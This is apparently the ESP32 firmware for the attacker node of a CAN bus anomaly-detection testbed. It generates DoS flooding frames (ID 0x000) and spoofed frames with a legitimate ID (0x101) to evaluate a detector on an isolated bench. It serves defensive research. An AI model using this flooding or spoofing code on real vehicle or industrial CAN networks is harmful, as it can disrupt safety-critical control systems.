// =====================================================================
// Attacker node (ESP32 #3) for the CAN bus anomaly-detection testbed
// =====================================================================
//
// Part of the project "Implementation and Evaluation of CAN Bus
// Anomaly Detection on ESP32 Hardware". This node generates the attack
// traffic used to evaluate the detector on an isolated three-node test
// bench (sender, receiver, attacker). It is not intended for use on any
// real or shared CAN network.
//
// Two attack modes, selected by ATTACK_MODE below:
//   MODE_FLOOD : transmits the unused identifier 0x000 as fast as the bus
//                allows (DoS flooding). 0x000 is outside the seven normal
//                identifiers, so the detector maps it to [UNK].
//   MODE_SPOOF : transmits the legitimate identifier 0x101 at a higher
//                rate than the sender. The first payload byte is set to
//                MARKER_BYTE and the DLC to 8 (genuine 0x101 frames use a
//                DLC of 2) so the logging/labelling script can separate
//                spoofed frames from genuine ones in the saved CSV.
//
// Bus settings (identical on all three nodes):
//   TWAI TX = GPIO19, RX = GPIO18, 500 kbit/s, normal mode.
//   Normal mode (not listen-only) is required so this node acknowledges
//   frames like any other node on the bus.
//
// A push-button on BUTTON_PIN (wired to GND, internal pull-up) starts and
// stops the attack. The start and stop times are also printed to Serial so
// they can be marked in the host log.

#include <Arduino.h>
#include "driver/twai.h"

// ---- Pin configuration ----
#define CAN_TX_PIN   GPIO_NUM_19
#define CAN_RX_PIN   GPIO_NUM_18
#define BUTTON_PIN   GPIO_NUM_0    // "BOOT" button on many ESP32 boards

// ---- Attack configuration ----
#define MODE_FLOOD   0
#define MODE_SPOOF   1
#define ATTACK_MODE  MODE_SPOOF    // set to MODE_FLOOD for the flooding run

#define FLOOD_ID            0x000  // unused identifier -> flagged as [UNK]
#define SPOOF_ID            0x101  // legitimate identifier (see SPOOF_ID in the Colab notebook)
#define SPOOF_INTERVAL_MS   20     // the sender transmits 0x101 every 500 ms; this is much faster
#define MARKER_BYTE         0xA5   // first payload byte of spoofed frames, used only for labelling

// ---- State ----
static bool     attacking  = false;
static bool     lastButton = HIGH;
static uint32_t sentCount  = 0;    // frames successfully queued for transmission
static uint32_t failCount  = 0;    // transmit attempts that failed (queue full, bus busy, error)
static uint32_t lastReport = 0;

static bool setupCan() {
  twai_general_config_t g = TWAI_GENERAL_CONFIG_DEFAULT(CAN_TX_PIN, CAN_RX_PIN, TWAI_MODE_NORMAL);
  g.tx_queue_len = 64;
  twai_timing_config_t t = TWAI_TIMING_CONFIG_500KBITS();
  twai_filter_config_t f = TWAI_FILTER_CONFIG_ACCEPT_ALL();
  if (twai_driver_install(&g, &t, &f) != ESP_OK) return false;
  if (twai_start() != ESP_OK) return false;
  return true;
}

// Transmit one flooding frame. Returns true if it was queued.
// Timeout 0 means the call does not wait: if the TX queue is full it returns
// immediately and the next loop iteration tries again, which keeps the
// transmission rate as high as the bus allows.
static bool sendFlood() {
  twai_message_t m = {};
  m.identifier = FLOOD_ID;
  m.data_length_code = 8;
  for (int i = 0; i < 8; i++) m.data[i] = 0xFF;
  return twai_transmit(&m, 0) == ESP_OK;
}

// Transmit one spoofed 0x101 frame, marked with MARKER_BYTE. Returns true if queued.
static bool sendSpoof() {
  twai_message_t m = {};
  m.identifier = SPOOF_ID;
  m.data_length_code = 8;
  m.data[0] = MARKER_BYTE;
  for (int i = 1; i < 8; i++) m.data[i] = 0x00;
  return twai_transmit(&m, pdMS_TO_TICKS(2)) == ESP_OK;
}

static void printStatus() {
  twai_status_info_t s;
  if (twai_get_status_info(&s) == ESP_OK) {
    const char *state = s.state == TWAI_STATE_RUNNING ? "RUNNING"
                      : s.state == TWAI_STATE_BUS_OFF ? "BUS_OFF"
                      : s.state == TWAI_STATE_STOPPED ? "STOPPED" : "RECOVERING";
    Serial.printf("  state=%s tx_err=%lu rx_err=%lu tx_queued=%lu tx_failed=%lu\n",
                  state, (unsigned long)s.tx_error_counter, (unsigned long)s.rx_error_counter,
                  (unsigned long)s.msgs_to_tx, (unsigned long)s.tx_failed_count);
  }
}

static void startAttack() {
  attacking = true;
  sentCount = 0;
  failCount = 0;
  Serial.printf("ATTACK_START mode=%s t_us=%llu\n",
                ATTACK_MODE == MODE_FLOOD ? "flood" : "spoof",
                (unsigned long long)esp_timer_get_time());
}

static void stopAttack() {
  attacking = false;
  Serial.printf("ATTACK_STOP t_us=%llu frames_sent=%lu frames_failed=%lu\n",
                (unsigned long long)esp_timer_get_time(),
                (unsigned long)sentCount, (unsigned long)failCount);
  printStatus();
}

void setup() {
  Serial.begin(115200);
  delay(500);
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  if (setupCan()) {
    Serial.println("Attacker node ready (500 kbit/s). Press the button to start/stop the attack.");
    Serial.printf("Mode = %s\n", ATTACK_MODE == MODE_FLOOD ? "FLOOD (0x000)" : "SPOOF (0x101, marked)");
  } else {
    Serial.println("ERROR: CAN start failed.");
    while (true) delay(1000);
  }
}

void loop() {
  // Button handling: a falling edge toggles the attack on or off.
  bool b = digitalRead(BUTTON_PIN);
  if (lastButton == HIGH && b == LOW) {
    attacking ? stopAttack() : startAttack();
    delay(250);   // simple debounce
  }
  lastButton = b;

  // Generate attack traffic while active.
  if (attacking) {
    if (ATTACK_MODE == MODE_FLOOD) {
      // No delay: transmit as fast as the loop allows. sendFlood() returns
      // immediately rather than blocking, so this is "as fast as possible".
      if (sendFlood()) sentCount++; else failCount++;
    } else {
      static uint32_t lastSpoof = 0;
      uint32_t now = millis();
      if (now - lastSpoof >= SPOOF_INTERVAL_MS) {
        lastSpoof = now;
        if (sendSpoof()) sentCount++; else failCount++;
      }
    }
  }

  // Once per second, report the rate while attacking.
  uint32_t now = millis();
  if (now - lastReport >= 1000) {
    lastReport = now;
    if (attacking) {
      Serial.printf("attacking: %lu sent/s, %lu failed/s\n",
                    (unsigned long)sentCount, (unsigned long)failCount);
      printStatus();
      sentCount = 0;
      failCount = 0;
    }
  }
}
